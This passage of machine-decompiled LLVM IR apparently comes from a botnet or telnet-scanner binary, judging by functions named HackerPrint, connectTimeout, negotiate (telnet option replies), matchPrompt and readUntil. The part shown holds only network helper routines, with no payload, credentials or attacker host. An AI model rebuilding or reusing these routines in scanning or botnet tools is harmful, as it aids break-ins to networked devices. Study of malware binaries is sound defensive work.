dec_label_pc_9a08:                                ; preds = %dec_label_pc_99e0
  %v13_9990 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9a0c = udiv i32 %arg1, 32
  %v3_9a18 = mul nuw nsw i32 %v3_9a0c, 4
  %v2_9a20 = add nsw i32 %v3_9a18, -160
  %v2_9a24 = add i32 %v2_9a20, %v13_9990
  %v1_9a28 = inttoptr i32 %v2_9a24 to i32*
  %v2_9a28 = load i32, i32* %v1_9a28, align 4
  %v1_9a30 = urem i32 %arg1, 32
  %v6_9a38 = shl i32 1, %v1_9a30
  %v2_9a3c = or i32 %v2_9a28, %v6_9a38
  store i32 %v2_9a3c, i32* %v1_9a28, align 4
  %v1_9a5c = add i32 %arg1, 1
  %v2_9a68 = ptrtoint i32* %stack_var_-184 to i32
  store i32 0, i32* @r2, align 4
  %v5_9a7c = call i32 @__libc_select(i32 %v1_9a5c, i32 %v2_99cc, i32 0, i32 %v2_99cc, i32 %v2_9a68)
  %v5_9a90 = icmp sgt i32 %v5_9a7c, 0
  br i1 %v5_9a90, label %dec_label_pc_9c24.preheader, label %dec_label_pc_9b90.preheader

dec_label_pc_9b90.preheader:                      ; preds = %dec_label_pc_9a08
  %v7_9b9823 = icmp slt i32 %tmp33, 10
  br i1 %v7_9b9823, label %dec_label_pc_9ad0.lr.ph, label %dec_label_pc_9c24.preheader

dec_label_pc_9ad0.lr.ph:                          ; preds = %dec_label_pc_9b90.preheader, %dec_label_pc_9b84
  %stack_var_-44.024 = phi i32 [ %v1_9b88, %dec_label_pc_9b84 ], [ %tmp33, %dec_label_pc_9b90.preheader ]
  %v2_9a9c = load i32, i32* @global_var_2b5d0.55, align 4
  %v3_9aa8 = call i32 @HackerPrint(i32 %v2_9a9c, i32 ptrtoint ([5 x i8]* @global_var_1d238.57 to i32))
  store i32 30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_9ad0

dec_label_pc_9ad0:                                ; preds = %dec_label_pc_9ad0.lr.ph, %dec_label_pc_9ad0
  %storemerge615 = phi i32 [ 0, %dec_label_pc_9ad0.lr.ph ], [ %v1_9ae4, %dec_label_pc_9ad0 ]
  %v5_9adc = mul nuw nsw i32 %storemerge615, 4
  %v6_9adc = add i32 %v5_9adc, %v2_99cc
  %v7_9adc = inttoptr i32 %v6_9adc to i32*
  store i32 0, i32* %v7_9adc, align 4
  %v1_9ae4 = add nuw nsw i32 %storemerge615, 1
  %tmp53 = icmp ult i32 %v1_9ae4, 32
  br i1 %tmp53, label %dec_label_pc_9ad0, label %dec_label_pc_9af8

dec_label_pc_9af8:                                ; preds = %dec_label_pc_9ad0
  %v2_9b18 = load i32, i32* %v1_9a28, align 4
  %v2_9b2c = or i32 %v2_9b18, %v6_9a38
  store i32 %v2_9b2c, i32* %v1_9a28, align 4
  store i32 0, i32* @r2, align 4
  %v5_9b6c = call i32 @__libc_select(i32 %v1_9a5c, i32 %v2_99cc, i32 0, i32 %v2_99cc, i32 %v2_9a68)
  %v5_9b80 = icmp sgt i32 %v5_9b6c, 0
  br i1 %v5_9b80, label %dec_label_pc_9c24.preheader, label %dec_label_pc_9b84

dec_label_pc_9b84:                                ; preds = %dec_label_pc_9af8
  %v1_9b88 = add nsw i32 %stack_var_-44.024, 1
  %v7_9b98 = icmp slt i32 %v1_9b88, 10
  br i1 %v7_9b98, label %dec_label_pc_9ad0.lr.ph, label %dec_label_pc_9c24.preheader

dec_label_pc_9c24.preheader:                      ; preds = %dec_label_pc_9b84, %dec_label_pc_9af8, %dec_label_pc_9b90.preheader, %dec_label_pc_9a08
  %v5_9bcc = bitcast i8* %stack_var_-185 to i32*
  %not.v7_9c2c57 = icmp sgt i32 %arg3, 1
  %v2_9c4459 = icmp eq i1 %not.v7_9c2c57, false
  br i1 %v2_9c4459, label %dec_label_pc_9c4c, label %dec_label_pc_9bb0

dec_label_pc_9bb0:                                ; preds = %dec_label_pc_9c24.preheader, %dec_label_pc_9c18
  %v1_9c2862.in = phi i32 [ %v1_9c2862, %dec_label_pc_9c18 ], [ %arg3, %dec_label_pc_9c24.preheader ]
  %stack_var_-40.061 = phi i8* [ %v5_9c08, %dec_label_pc_9c18 ], [ %arg2, %dec_label_pc_9c24.preheader ]
  %stack_var_-36.060 = phi i32 [ %v1_9c1c, %dec_label_pc_9c18 ], [ 0, %dec_label_pc_9c24.preheader ]
  %v1_9c2862 = add i32 %v1_9c2862.in, -1
  %v2_9bb4 = load i32, i32* @global_var_2b5d0.55, align 4
  %v6_9bcc = call i32 @__libc_recv(i32 %v2_9bb4, i32* %v5_9bcc, i32 1, i32 0, i32 %v1_9c2862)
  %v7_9bd4 = icmp eq i32 %v6_9bcc, 1
  br i1 %v7_9bd4, label %dec_label_pc_9bf4, label %dec_label_pc_9bdc

dec_label_pc_9bdc:                                ; preds = %dec_label_pc_9bb0
  store i8 0, i8* %stack_var_-40.061, align 1
  br label %dec_label_pc_9c60

dec_label_pc_9bf4:                                ; preds = %dec_label_pc_9bb0
  %v3_9bf4 = load i8, i8* %stack_var_-185, align 1
  %v4_9bf8 = ptrtoint i8* %stack_var_-40.061 to i32
  store i8 %v3_9bf4, i8* %stack_var_-40.061, align 1
  %v1_9c04 = add i32 %v4_9bf8, 1
  %v5_9c08 = inttoptr i32 %v1_9c04 to i8*
  %v3_9c0c = load i8, i8* %stack_var_-185, align 1
  %v7_9c10 = icmp eq i8 %v3_9c0c, 10
  br i1 %v7_9c10, label %dec_label_pc_9c4c, label %dec_label_pc_9c18

dec_label_pc_9c18:                                ; preds = %dec_label_pc_9bf4
  %v1_9c1c = add i32 %stack_var_-36.060, 1
  %not.v7_9c2c = icmp sgt i32 %v1_9c2862, 1
  %v2_9c44 = icmp eq i1 %not.v7_9c2c, false
  br i1 %v2_9c44, label %dec_label_pc_9c4c, label %dec_label_pc_9bb0

dec_label_pc_9c4c:                                ; preds = %dec_label_pc_9bf4, %dec_label_pc_9c18, %dec_label_pc_9c24.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_9c24.preheader ], [ %v1_9c1c, %dec_label_pc_9c18 ], [ %stack_var_-36.060, %dec_label_pc_9bf4 ]
  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_9c24.preheader ], [ %v5_9c08, %dec_label_pc_9c18 ], [ %v5_9c08, %dec_label_pc_9bf4 ]
  store i8 0, i8* %stack_var_-40.1, align 1
  br label %dec_label_pc_9c60

dec_label_pc_9c60:                                ; preds = %dec_label_pc_9bdc, %dec_label_pc_9c4c
  %storemerge = phi i32 [ -1, %dec_label_pc_9bdc ], [ %stack_var_-36.0.lcssa, %dec_label_pc_9c4c ]
  %v2_9c6c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_9c6c, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_9c2862, { 1, 0, 2 }
  uselistorder i8* %stack_var_-40.061, { 1, 2, 0 }
  uselistorder i32 %v1_9b88, { 1, 0 }
  uselistorder i32 %storemerge615, { 1, 0 }
  uselistorder i32 %storemerge527, { 1, 0 }
  uselistorder i32 %v2_99cc, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9c60, { 1, 0 }
  uselistorder label %dec_label_pc_9c4c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9bb0, { 1, 0 }
  uselistorder label %dec_label_pc_9ad0, { 1, 0 }
  uselistorder label %dec_label_pc_9ad0.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_99e0, { 1, 0 }
}

define i32 @hostname_to_ip(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 40068, i32* %stack_var_-4, align 4
  %v2_9c80 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9c80, i32* @fp, align 4
  %v1_9c94 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_9ca4 = icmp eq i32 %v1_9c94, 0
  br i1 %v2_9ca4, label %dec_label_pc_9cac, label %dec_label_pc_9cc0

dec_label_pc_9cac:                                ; preds = %entry
  %v3_9cb0 = call i32 @__GI_herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1d240.59, i32 0, i32 0))
  br label %dec_label_pc_9d38

dec_label_pc_9cc0:                                ; preds = %entry
  %v1_9cc4 = add i32 %v1_9c94, 16
  %v2_9cc4 = inttoptr i32 %v1_9cc4 to i32*
  %v3_9cc4 = load i32, i32* %v2_9cc4, align 4
  %v1_9ce8 = inttoptr i32 %v3_9cc4 to i32*
  %v2_9ce8 = load i32, i32* %v1_9ce8, align 4
  %v2_9cec = icmp eq i32 %v2_9ce8, 0
  br i1 %v2_9cec, label %dec_label_pc_9d30, label %dec_label_pc_9cf4

dec_label_pc_9cf4:                                ; preds = %dec_label_pc_9cc0
  %v2_9d08 = load i32, i32* %v1_9ce8, align 4
  %v1_9d0c = inttoptr i32 %v2_9d08 to i32*
  %v2_9d0c = load i32, i32* %v1_9d0c, align 4
  store i32 %v2_9d0c, i32* @r0, align 4
  %v1_9d10 = call i32 @__GI_inet_ntoa(i32 %v2_9d0c)
  %v2_9d20 = inttoptr i32 %v1_9d10 to i8*
  %v3_9d20 = call i32 @strcpy(i32 %arg2, i8* %v2_9d20)
  br label %dec_label_pc_9d38

dec_label_pc_9d30:                                ; preds = %dec_label_pc_9cc0
  br label %dec_label_pc_9d38

dec_label_pc_9d38:                                ; preds = %dec_label_pc_9cf4, %dec_label_pc_9cac, %dec_label_pc_9d30
  %v3_9d38 = phi i32 [ 0, %dec_label_pc_9cf4 ], [ 1, %dec_label_pc_9cac ], [ 1, %dec_label_pc_9d30 ]
  ret i32 %v3_9d38

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_9d38, { 2, 0, 1 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9d50 = load i32, i32* @fp, align 4
  store i32 %v3_9d50, i32* %stack_var_-16, align 4
  %v13_9d50 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r2, align 4
  %v2_9d78 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_9d88 = or i32 %v2_9d78, 2048
  store i32 %v1_9d88, i32* @r2, align 4
  %v2_9d9c = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_9db8 = urem i32 %arg3, 65536
  %v1_9dc0 = call i32 @htons(i32 %v3_9db8)
  %v3_9de8 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_9df0 = icmp eq i32 %v3_9de8, 0
  br i1 %v2_9df0, label %dec_label_pc_9e04, label %dec_label_pc_9df8

dec_label_pc_9df8:                                ; preds = %entry
  br label %dec_label_pc_9fbc

dec_label_pc_9e04:                                ; preds = %entry
  %v3_9e2c = bitcast i32* %stack_var_-48 to %sockaddr*
  %v4_9e2c = call i32 @__libc_connect(i32 %arg1, %sockaddr* %v3_9e2c, i32 16)
  %v1_9e3c = icmp slt i32 %v4_9e2c, 0
  br i1 %v1_9e3c, label %dec_label_pc_9e44, label %dec_label_pc_9f80

dec_label_pc_9e44:                                ; preds = %dec_label_pc_9e04
  %v0_9e44 = call i32 @__errno_location()
  %v1_9e4c = inttoptr i32 %v0_9e44 to i32*
  %v2_9e4c = load i32, i32* %v1_9e4c, align 4
  %v7_9e50 = icmp eq i32 %v2_9e4c, 115
  br i1 %v7_9e50, label %dec_label_pc_9e7c.lr.ph, label %dec_label_pc_9f74

dec_label_pc_9e7c.lr.ph:                          ; preds = %dec_label_pc_9e44
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_9e68 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9e7c

dec_label_pc_9e7c:                                ; preds = %dec_label_pc_9e7c.lr.ph, %dec_label_pc_9e7c
  %storemerge14 = phi i32 [ 0, %dec_label_pc_9e7c.lr.ph ], [ %v1_9e90, %dec_label_pc_9e7c ]
  %v5_9e88 = mul nuw nsw i32 %storemerge14, 4
  %v6_9e88 = add i32 %v5_9e88, %v2_9e68
  %v7_9e88 = inttoptr i32 %v6_9e88 to i32*
  store i32 0, i32* %v7_9e88, align 4
  %v1_9e90 = add nuw nsw i32 %storemerge14, 1
  %tmp32 = icmp ult i32 %v1_9e90, 32
  br i1 %tmp32, label %dec_label_pc_9e7c, label %dec_label_pc_9ea4

dec_label_pc_9ea4:                                ; preds = %dec_label_pc_9e7c
  %v3_9ea8 = udiv i32 %arg1, 32
  %v3_9eb4 = mul nuw nsw i32 %v3_9ea8, 4
  %v2_9ebc = add nsw i32 %v3_9eb4, -160
  %v2_9ec0 = add i32 %v2_9ebc, %v13_9d50
  %v1_9ec4 = inttoptr i32 %v2_9ec0 to i32*
  %v2_9ec4 = load i32, i32* %v1_9ec4, align 4
  %v1_9ecc = urem i32 %arg1, 32
  %v6_9ed4 = shl i32 1, %v1_9ecc
  %v2_9ed8 = or i32 %v2_9ec4, %v6_9ed4
  store i32 %v2_9ed8, i32* %v1_9ec4, align 4
  %v1_9ef8 = add i32 %arg1, 1
  %v2_9f00 = ptrtoint i32* %stack_var_-184 to i32
  %v5_9f18 = call i32 @__libc_select(i32 %v1_9ef8, i32 0, i32 %v2_9e68, i32 0, i32 %v2_9f00)
  %tmp33 = icmp slt i32 %v5_9f18, 1
  br i1 %tmp33, label %dec_label_pc_9f68, label %dec_label_pc_9f28

dec_label_pc_9f28:                                ; preds = %dec_label_pc_9ea4
  %v0_9f4c = call i32 @getsockopt()
  %v3_9f50 = load i32, i32* %stack_var_-192, align 4
  %v2_9f54 = icmp eq i32 %v3_9f50, 0
  br i1 %v2_9f54, label %dec_label_pc_9f80, label %dec_label_pc_9f5c

dec_label_pc_9f5c:                                ; preds = %dec_label_pc_9f28
  br label %dec_label_pc_9fbc

dec_label_pc_9f68:                                ; preds = %dec_label_pc_9ea4
  br label %dec_label_pc_9fbc

dec_label_pc_9f74:                                ; preds = %dec_label_pc_9e44
  br label %dec_label_pc_9fbc

dec_label_pc_9f80:                                ; preds = %dec_label_pc_9e04, %dec_label_pc_9f28
  store i32 0, i32* @r2, align 4
  %v2_9f8c = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_9f9c = and i32 %v2_9f8c, -2049
  store i32 %v1_9f9c, i32* @r2, align 4
  %v2_9fb0 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_9fbc

dec_label_pc_9fbc:                                ; preds = %dec_label_pc_9f74, %dec_label_pc_9f68, %dec_label_pc_9f5c, %dec_label_pc_9df8, %dec_label_pc_9f80
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_9f68 ], [ 1, %dec_label_pc_9f80 ], [ 0, %dec_label_pc_9f5c ], [ 0, %dec_label_pc_9f74 ], [ 0, %dec_label_pc_9df8 ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_9e68, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 1, 0, 5, 6, 7 }
  uselistorder label %dec_label_pc_9fbc, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_9f80, { 1, 0 }
  uselistorder label %dec_label_pc_9e7c, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_9fcc = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_9fcc, i32* @ip, align 4
  %v3_9fd0 = load i32, i32* @r4, align 4
  %v6_9fd0 = load i32, i32* @r5, align 4
  %v9_9fd0 = load i32, i32* @r6, align 4
  %v0_9fdc = call i32 @__libc_fork()
  %v2_9fec = icmp eq i32 %v0_9fdc, 0
  br i1 %v2_9fec, label %dec_label_pc_a14c, label %dec_label_pc_a000

dec_label_pc_a000:                                ; preds = %entry
  %v2_a004 = load i32, i32* @global_var_2b5d4.61, align 4
  %v5_a004 = load i32, i32* @global_var_2b5d8.62, align 4
  %v2_a010 = add i32 %v2_a004, 1
  %v3_a010 = icmp eq i32 %v2_a010, 0
  %v4_a014 = zext i1 %v3_a010 to i32
  %v5_a014 = add i32 %v4_a014, %v5_a004
  store i32 %v2_a010, i32* @global_var_2b5d4.61, align 4
  store i32 %v5_a014, i32* @global_var_2b5d8.62, align 4
  %v3_a028 = udiv i32 %v2_a010, 1073741824
  %v3_a02c = mul i32 %v5_a014, 4
  %v2_a030 = or i32 %v3_a02c, %v3_a028
  store i32 %v2_a030, i32* @r4, align 4
  %v3_a034 = mul i32 %v2_a010, 4
  %v1_a038 = add i32 %v3_a034, 4
  %v1_a040 = call i32 @malloc(i32 %v1_a038)
  br label %dec_label_pc_a098

dec_label_pc_a058:                                ; preds = %dec_label_pc_a098, %dec_label_pc_a0e4
  %v3_a05c = mul i32 %storemerge2, 4
  %v2_a068 = add i32 %v3_a05c, %v1_a040
  %v2_a07c = load i32, i32* @global_var_31854.64, align 4
  %v2_a080 = add i32 %v2_a07c, %v3_a05c
  %v1_a084 = inttoptr i32 %v2_a080 to i32*
  %v2_a084 = load i32, i32* %v1_a084, align 4
  %v2_a088 = inttoptr i32 %v2_a068 to i32*
  store i32 %v2_a084, i32* %v2_a088, align 4
  %v1_a090 = add i32 %storemerge2, 1
  br label %dec_label_pc_a098

dec_label_pc_a098:                                ; preds = %dec_label_pc_a000, %dec_label_pc_a058
  %storemerge2 = phi i32 [ 0, %dec_label_pc_a000 ], [ %v1_a090, %dec_label_pc_a058 ]
  %v2_a0b0 = load i32, i32* @global_var_2b5d4.61, align 4
  %v5_a0b0 = load i32, i32* @global_var_2b5d8.62, align 4
  %v2_a0c4 = add i32 %v2_a0b0, -1
  %v3_a0c4 = icmp ne i32 %v2_a0b0, 0
  %v3_a0c8 = add i32 %v5_a0b0, -1
  %v5_a0c8 = sext i1 %v3_a0c4 to i32
  %v9_a0dc = icmp eq i32 %v3_a0c8, %v5_a0c8
  br i1 %v9_a0dc, label %dec_label_pc_a0e4, label %dec_label_pc_a058

dec_label_pc_a0e4:                                ; preds = %dec_label_pc_a098
  store i32 %v2_a0c4, i32* @r5, align 4
  store i32 %storemerge2, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_a0c4, %storemerge2
  br i1 %tmp, label %dec_label_pc_a058, label %dec_label_pc_a104

dec_label_pc_a104:                                ; preds = %dec_label_pc_a0e4
  store i32 %v5_a0b0, i32* @r4, align 4
  %v3_a10c = mul i32 %v2_a0b0, 4
  %v2_a118 = add i32 %v1_a040, -4
  %v1_a11c = add i32 %v2_a118, %v3_a10c
  %v2_a124 = inttoptr i32 %v1_a11c to i32*
  store i32 %v0_9fdc, i32* %v2_a124, align 4
  %v2_a12c = load i32, i32* @global_var_31854.64, align 4
  %v1_a134 = call i32 @free(i32 %v2_a12c)
  store i32 ptrtoint (i32* @global_var_31854.64 to i32), i32* @r2, align 4
  store i32 %v1_a040, i32* @global_var_31854.64, align 4
  br label %dec_label_pc_a14c

dec_label_pc_a14c:                                ; preds = %entry, %dec_label_pc_a104
  store i32 %v3_9fd0, i32* @r4, align 4
  store i32 %v6_9fd0, i32* @r5, align 4
  store i32 %v9_9fd0, i32* @r6, align 4
  ret i32 %v0_9fdc

; uselistorder directives
  uselistorder i32 %storemerge2, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a05c, { 1, 0 }
  uselistorder i32 %v1_a040, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a14c, { 1, 0 }
  uselistorder label %dec_label_pc_a098, { 1, 0 }
  uselistorder label %dec_label_pc_a058, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v1_a184 = add i32 %arg2, 1
  %v1_a188 = inttoptr i32 %v1_a184 to i8*
  %v2_a188 = load i8, i8* %v1_a188, align 1
  %v7_a194 = icmp ult i8 %v2_a188, -5
  br i1 %v7_a194, label %dec_label_pc_a2e0, label %dec_label_pc_a19c

dec_label_pc_a19c:                                ; preds = %entry
  %v7_a1a4 = icmp eq i8 %v2_a188, -1
  br i1 %v7_a1a4, label %dec_label_pc_a1a8, label %dec_label_pc_a1c4

dec_label_pc_a1a8:                                ; preds = %dec_label_pc_a19c
  br label %dec_label_pc_a2e0

dec_label_pc_a1c4:                                ; preds = %dec_label_pc_a19c
  store i8 -1, i8* %stack_var_-17, align 1
  %v5_a1e0 = bitcast i8* %stack_var_-17 to i32*
  %v6_a1e0 = call i32 @__libc_send(i32 %arg1, i32* %v5_a1e0, i32 1, i32 16384)
  %v2_a1ec = load i8, i8* %v1_a188, align 1
  %v7_a1f0 = icmp eq i8 %v2_a1ec, -4
  br i1 %v7_a1f0, label %dec_label_pc_a1f8, label %dec_label_pc_a204

dec_label_pc_a1f8:                                ; preds = %dec_label_pc_a1c4
  store i8 -2, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2a4

dec_label_pc_a204:                                ; preds = %dec_label_pc_a1c4
  %v2_a20c = load i8, i8* %v1_a188, align 1
  %v7_a210 = icmp eq i8 %v2_a20c, -2
  br i1 %v7_a210, label %dec_label_pc_a218, label %dec_label_pc_a224

dec_label_pc_a218:                                ; preds = %dec_label_pc_a204
  store i8 -4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2a4

dec_label_pc_a224:                                ; preds = %dec_label_pc_a204
  %v2_a22c = load i8, i8* %v1_a188, align 1
  %v7_a230 = icmp eq i8 %v2_a22c, 3
  %v7_a244 = icmp eq i8 %v2_a22c, -3
  br i1 %v7_a230, label %dec_label_pc_a238, label %dec_label_pc_a270

dec_label_pc_a238:                                ; preds = %dec_label_pc_a224
  br i1 %v7_a244, label %dec_label_pc_a24c, label %dec_label_pc_a258

dec_label_pc_a24c:                                ; preds = %dec_label_pc_a238
  br label %dec_label_pc_a260

dec_label_pc_a258:                                ; preds = %dec_label_pc_a238
  br label %dec_label_pc_a260

dec_label_pc_a260:                                ; preds = %dec_label_pc_a24c, %dec_label_pc_a258
  %storemerge = phi i8 [ -3, %dec_label_pc_a258 ], [ -5, %dec_label_pc_a24c ]
  store i8 %storemerge, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2a4

dec_label_pc_a270:                                ; preds = %dec_label_pc_a224
  br i1 %v7_a244, label %dec_label_pc_a284, label %dec_label_pc_a290

dec_label_pc_a284:                                ; preds = %dec_label_pc_a270
  br label %dec_label_pc_a298

dec_label_pc_a290:                                ; preds = %dec_label_pc_a270
  br label %dec_label_pc_a298

dec_label_pc_a298:                                ; preds = %dec_label_pc_a284, %dec_label_pc_a290
  %storemerge4 = phi i8 [ -2, %dec_label_pc_a290 ], [ -4, %dec_label_pc_a284 ]
  store i8 %storemerge4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2a4

dec_label_pc_a2a4:                                ; preds = %dec_label_pc_a260, %dec_label_pc_a218, %dec_label_pc_a1f8, %dec_label_pc_a298
  %v5_a2b8 = call i32 @__libc_send(i32 %arg1, i32* nonnull %v5_a1e0, i32 1, i32 16384)
  %v1_a2c0 = add i32 %arg2, 2
  %v4_a2d4 = inttoptr i32 %v1_a2c0 to i32*
  %v5_a2d4 = call i32 @__libc_send(i32 %arg1, i32* %v4_a2d4, i32 1, i32 16384)
  br label %dec_label_pc_a2e0

dec_label_pc_a2e0:                                ; preds = %dec_label_pc_a1a8, %dec_label_pc_a2a4, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-17, { 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_a2e0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a2a4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_a298, { 1, 0 }
  uselistorder label %dec_label_pc_a260, { 1, 0 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_a310 = call i32 @strlen(i8* %arg1)
  %v2_a358 = add i32 %v3_a310, %tmp
  br label %dec_label_pc_a42c

dec_label_pc_a330:                                ; preds = %dec_label_pc_a3b8, %dec_label_pc_a394, %dec_label_pc_a370, %dec_label_pc_a34c
  %v1_a334 = add nsw i32 %stack_var_-24.013, 1
  %v7_a348 = icmp sgt i32 %v3_a310, %v1_a334
  br i1 %v7_a348, label %dec_label_pc_a34c, label %dec_label_pc_a3dc

dec_label_pc_a34c:                                ; preds = %dec_label_pc_a33c.preheader, %dec_label_pc_a330
  %stack_var_-24.013 = phi i32 [ %v1_a334, %dec_label_pc_a330 ], [ %stack_var_-24.1, %dec_label_pc_a33c.preheader ]
  %v2_a360 = sub i32 %v2_a358, %stack_var_-24.013
  %v1_a364 = inttoptr i32 %v2_a360 to i8*
  %v2_a364 = load i8, i8* %v1_a364, align 1
  %v2_a368 = icmp eq i8 %v2_a364, 0
  br i1 %v2_a368, label %dec_label_pc_a330, label %dec_label_pc_a370

dec_label_pc_a370:                                ; preds = %dec_label_pc_a34c
  %v2_a388 = load i8, i8* %v1_a364, align 1
  %v7_a38c = icmp eq i8 %v2_a388, 32
  br i1 %v7_a38c, label %dec_label_pc_a330, label %dec_label_pc_a394

dec_label_pc_a394:                                ; preds = %dec_label_pc_a370
  %v2_a3ac = load i8, i8* %v1_a364, align 1
  %v7_a3b0 = icmp eq i8 %v2_a3ac, 13
  br i1 %v7_a3b0, label %dec_label_pc_a330, label %dec_label_pc_a3b8

dec_label_pc_a3b8:                                ; preds = %dec_label_pc_a394
  %v2_a3d0 = load i8, i8* %v1_a364, align 1
  %v7_a3d4 = icmp eq i8 %v2_a3d0, 10
  br i1 %v7_a3d4, label %dec_label_pc_a330, label %dec_label_pc_a3dc

dec_label_pc_a3dc:                                ; preds = %dec_label_pc_a3b8, %dec_label_pc_a330, %dec_label_pc_a33c.preheader
  %stack_var_-24.0.lcssa = phi i32 [ %stack_var_-24.1, %dec_label_pc_a33c.preheader ], [ %stack_var_-24.013, %dec_label_pc_a3b8 ], [ %v1_a334, %dec_label_pc_a330 ]
  %v2_a3f0 = sub i32 %v2_a358, %stack_var_-24.0.lcssa
  %v1_a3f4 = inttoptr i32 %v2_a3f0 to i8*
  %v2_a3f4 = load i8, i8* %v1_a3f4, align 1
  %v2_a404 = add i32 %storemerge2, ptrtoint ([6 x i8]* @global_var_1d250.66 to i32)
  %v1_a408 = inttoptr i32 %v2_a404 to i8*
  %v2_a408 = load i8, i8* %v1_a408, align 1
  %v9_a40c = icmp eq i8 %v2_a3f4, %v2_a408
  %v1_a424 = add i32 %storemerge2, 1
  br i1 %v9_a40c, label %dec_label_pc_a44c, label %dec_label_pc_a42c

dec_label_pc_a42c:                                ; preds = %dec_label_pc_a3dc, %entry
  %stack_var_-24.1 = phi i32 [ 0, %entry ], [ %stack_var_-24.0.lcssa, %dec_label_pc_a3dc ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v1_a424, %dec_label_pc_a3dc ]
  %v3_a434 = call i32 @strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1d250.66, i32 0, i32 0))
  %v3_a43c = icmp ult i32 %storemerge2, %v3_a434
  br i1 %v3_a43c, label %dec_label_pc_a33c.preheader, label %dec_label_pc_a44c

dec_label_pc_a33c.preheader:                      ; preds = %dec_label_pc_a42c
  %v7_a34812 = icmp sgt i32 %v3_a310, %stack_var_-24.1
  br i1 %v7_a34812, label %dec_label_pc_a34c, label %dec_label_pc_a3dc

dec_label_pc_a44c:                                ; preds = %dec_label_pc_a42c, %dec_label_pc_a3dc
  %storemerge3 = phi i32 [ 1, %dec_label_pc_a3dc ], [ 0, %dec_label_pc_a42c ]
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 2, 0, 1 }
  uselistorder i32 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i32 %v3_a310, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a3dc, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a464 = load i32, i32* @fp, align 4
  store i32 %v3_a464, i32* %stack_var_-16, align 4
  %v13_a464 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_a4b4 = ptrtoint i32* %stack_var_-168 to i32
  %v3_a4f4 = udiv i32 %arg1, 32
  %v3_a500 = mul nuw nsw i32 %v3_a4f4, 4
  %v1_a518 = urem i32 %arg1, 32
  %v6_a520 = shl i32 1, %v1_a518
  %v1_a544 = add i32 %arg1, 1
  %v2_a54c = ptrtoint i32* %stack_var_-176 to i32
  %v6_a66c = inttoptr i32 %arg2 to i8*
  %v2_a680 = icmp eq i32 %arg3, 0
  %v1_a68c = inttoptr i32 %arg6 to i8*
